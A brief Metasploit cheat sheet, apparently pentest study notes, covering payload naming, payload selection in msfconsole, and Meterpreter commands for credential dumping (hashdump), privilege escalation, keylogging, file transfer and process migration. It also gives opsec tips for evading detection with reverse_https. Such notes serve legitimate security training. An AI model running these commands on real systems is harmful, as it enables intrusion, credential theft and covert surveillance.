# MSF — Payloads

Payload naming tells you the type: `windows/x64/meterpreter/reverse_tcp` = staged (stager + stage). `windows/x64/meterpreter_reverse_tcp` = single (inline). The `/` separator is the tell.

Filter payloads with chained grep instead of scrolling:

```
msf6 exploit(...)> grep meterpreter grep reverse_tcp show payloads
```

Set by index from that filtered list:

```
msf6 exploit(...)> set payload 15
```

After setting a payload, `show options` updates — new Required fields appear (LHOST/LPORT for reverse, nothing extra for bind).

Inside Meterpreter — key commands:

```
meterpreter > getuid          # whoami equivalent — whoami doesn't work here
meterpreter > getprivs        # check available privs
meterpreter > getsystem       # attempt LPE to SYSTEM
meterpreter > hashdump        # dump SAM
meterpreter > shell           # drop to Windows CMD shell
meterpreter > background      # bg the session, back to msfconsole
meterpreter > ps              # list processes
meterpreter > migrate <PID>   # migrate into another process
meterpreter > download <FILE>
meterpreter > upload <FILE>
meterpreter > search -f *.config
meterpreter > keyscan_start / keyscan_dump / keyscan_stop
meterpreter > screenshot
```

> [!tip] `shell` inside Meterpreter opens a CMD channel — `CTRL+Z` to background it and return to Meterpreter prompt without killing the session.

Reverse beats bind: outbound traffic is trusted, inbound filtered. Default to `reverse_tcp` / `reverse_https`. Use bind only when you can't get outbound callbacks.

`reverse_https` > `reverse_tcp` for opsec — blends into HTTPS traffic, harder to flag than raw TCP on 4444.